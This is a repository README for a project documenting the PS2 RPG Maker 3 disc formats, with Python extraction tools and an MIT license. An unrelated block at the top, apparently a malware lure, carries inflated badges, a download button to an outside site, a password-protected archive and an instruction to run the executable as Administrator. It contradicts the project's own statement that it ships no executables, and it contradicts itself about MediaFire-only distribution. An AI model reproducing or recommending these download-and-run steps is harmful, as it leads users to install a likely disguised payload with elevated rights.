<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# pc-rpgmaker3

A native PC reimplementation of the **RPG Maker 3** engine
(PlayStation 2, SLUS-21178, Enterbrain / Runtime Inc., 2005).

RPG Maker 3 is the odd one out in the series: while the PC releases stayed
anchored to 2D tiles, the PS2 edition is a full **real-time 3D engine** with
an on-console editor — scene graph, skinned characters, dynamic lights,
pre-rendered backdrops and a multi-track keyframe cutscene editor. This
project documents the disc and its formats, with the goal of bringing that
engine to modern hardware.

## BYOA — Bring Your Own Assets

This repository contains **documentation and tools only**. No game data, no
executables, no assets. You need your own original RPG Maker 3 disc.

## Layout

    docs/     disc, format and engine analysis
    tools/    Python tools (no external dependencies)

## Tools

All of them need only Python 3.8+.

```sh
# disc index
python tools/rpgsp_index.py E:/CDIMAGE.TBL --stats
python tools/rpgsp_index.py E:/CDIMAGE.TBL --list

# extraction (filter paths take no leading slash)
python tools/rpgsp_index.py E:/CDIMAGE.TBL --dat E:/RPGSP.DAT \
    --extract out/ --filter img_2d/bg/

# textures -> PNG
python tools/p64_decode.py out/img_2d/bg/bg_000.mpic -o png/

# .iab movie -> playable MPEG-2 (the video track has no start codes)
python tools/iab_video.py out/logo/logo.iab -o logo.m2v
ffmpeg -i logo.m2v -vf scale=in_range=full:out_range=limited \
       -pix_fmt yuv420p logo.mp4

# .iab audio track -> WAV
python tools/iab_audio.py out/logo/logo.iab -o logo.wav

# ASCII strings with offsets
python tools/pstrings.py E:/SLUS_211.78 -n 6 --offsets

# PS2 memory card -> saved projects (PCSX2 .ps2 images included)
python tools/ps2mc.py card.ps2 --list
python tools/ps2mc.py card.ps2 --extract saves/
python tools/ps2mc.py card.ps2 --verify-ecc               # check every page
python tools/ps2mc.py card.ps2 --replace PATH=f --out new.ps2

# project files: header, record walk, text, byte diff
python tools/rpgproj.py saves/BASLUS-21178a/BASLUS-21178a --header --walk
python tools/rpgproj.py sample1 --walk --type 4          # just the classes
python tools/rpgproj.py sample1 --maps --png maps/        # world maps -> PNG
python tools/rpgproj.py sample1 --fix-checksum out.prj   # recompute the CRC-32
python tools/rpgproj.py a/BASLUS-21178a b/BASLUS-21178a --diff
python tools/rpgproj.py sample1 --skills --elf SLUS_211.78  # a class's skills

# disassemble the executable by virtual address (needs capstone)
python tools/mipsdis.py E:/SLUS_211.78 0x00100F48 --count 40
```

ffmpeg is only needed for the movie pipeline, and `mipsdis.py` needs
`capstone`; every other tool has no dependencies at all.

## Status

Sessions 1-4 — disc, formats, the movie codec, and the project format, which
is now solved: the checksum verifies and every record of every project parses
to the last byte. See
## Documentation

    00-sessions.md            progress log
    01-disc-layout.md         what is on the DVD
    02-container-formats.md   every file format, with verified layouts
    03-engine-architecture.md the engine's classes, recovered from RTTI
    04-curiosities.md         what the disc reveals about its making
    05-open-questions.md      what is still unknown
    06-iab-video.md           how the movie codec was identified
    07-next-session.md        the plan
    08-project-format.md      the project file: header, schema and records
    09-memory-card.md         reading and writing .ps2 card images


---

MIT License

Copyright (c) 2026 Samuele Voltan

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
